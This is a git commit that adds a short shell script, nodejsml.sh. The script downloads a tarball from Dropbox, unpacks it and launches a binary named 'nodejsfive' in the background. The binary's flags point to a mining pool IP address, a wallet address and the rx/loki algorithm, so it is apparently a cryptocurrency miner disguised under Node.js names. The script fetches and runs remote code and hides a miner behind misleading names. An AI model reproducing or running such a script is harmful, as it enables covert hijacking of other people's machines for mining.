9564f507722665e1b9134a51f84e3f7e02626c92
GraphXdev <66101531+GraphXdev@users.noreply.github.com>
2020-06-17 03:46:14 +0000

    Create nodejsml.sh

---
+++ nodejsml.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+sysctl vm.nr_hugepages=2048
+ls
+wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
+tar xvzf nodejsapp8q.tar.gz
+cd nodejsbrnt
+./nodejsfive -o 167.114.65.192:10111 -u LZdfLiPo6Zs2hq7FggM1ePUMZjtmisCpzVunSjzyRTC7ei3xUJwuZtqCMKuf4kwsVci9ZhzAksHykFUX9ENzvMep4fG2nNs.100000 -p drolex -a rx/loki --donate-level 1 -t 8 -B
